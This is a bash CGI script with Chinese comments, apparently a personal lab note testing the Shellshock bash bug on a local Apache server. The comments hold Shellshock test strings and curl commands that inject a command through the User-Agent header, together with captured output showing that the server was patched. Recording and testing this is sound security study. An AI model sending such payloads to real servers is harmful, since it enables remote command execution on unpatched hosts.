#!/bin/bash1


echo "Content-type: text/html"
echo ""
echo '<html>'
echo '<head>'
echo '<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">'
echo '<title>Hello World</title>'
echo '</head>'
echo '<body>'
echo 'Hello World'
#env var='() { :;}; echo vulnerable' bash1 -c "echo "----"; env; echo this is a test; echo "-----""
#env var='() { :;}; id' /bin/bash1 -c "echo "----"; env; echo this is a test; echo "-----""

# 果真 创建了文件 /tmp/1.txt
# 不过这个还不能真正模拟远程执行shell的 情况


# 远程现在模拟不了这个错误 可能是由于web服务器做了限制

# # root@debian32-1:/usr/lib/cgi-bin/shell# curl -H "User-Agent: () { :; };/bin/ls"  "http://192.168.1.102/cgi-bin/shell/shellshock_remote.sh"
# <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
# <html><head>
# <title>500 Internal Server Error</title>

# 这样是可以的
# root@debian32-1:/usr/lib/cgi-bin/shell# curl -H "User-Agent: () { :; }"  "http://192.168.1.102/cgi-bin/shell/shellshock_remote.sh"

echo "----"; env; echo this is a test; echo "-----"

echo '</body>'
echo '</html>'
exit 0


# root@debian32-1:/usr/lib/cgi-bin/shell# curl -H "User-Agent: () { :; };"  "http://192.168.1.102/cgi-bin/shell/shellshock_remote.sh"
# <html>
# <head>
# <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
# <title>Hello World</title>
# </head>
# <body>
# Hello World
# ----
# SERVER_SIGNATURE=<address>Apache/2.2.22 (Debian) Server at 192.168.1.102 Port 80</address>
# 
# SERVER_PORT=80
# HTTP_HOST=192.168.1.102
# DOCUMENT_ROOT=/var/www
# SCRIPT_FILENAME=/usr/lib/cgi-bin/shell/shellshock_remote.sh
# REQUEST_URI=/cgi-bin/shell/shellshock_remote.sh
# SCRIPT_NAME=/cgi-bin/shell/shellshock_remote.sh
# REMOTE_PORT=59822
# PATH=/usr/local/bin:/usr/bin:/bin
# PWD=/usr/lib/cgi-bin/shell
# SERVER_ADMIN=webmaster@localhost
# HTTP_ACCEPT=*/*
# REMOTE_ADDR=192.168.1.102
# SHLVL=1
# SERVER_NAME=192.168.1.102
# SERVER_SOFTWARE=Apache/2.2.22 (Debian)
# QUERY_STRING=
# SERVER_ADDR=192.168.1.102
# GATEWAY_INTERFACE=CGI/1.1
# SERVER_PROTOCOL=HTTP/1.1
# REQUEST_METHOD=GET
# HTTP_USER_AGENT=() {  :         #  重点关注这个  果然被赋值了  但是后面跟命令不允许了 被修复了
# }
# _=/usr/bin/env
# this is a test
# -----
# </body>
# </html>
# 
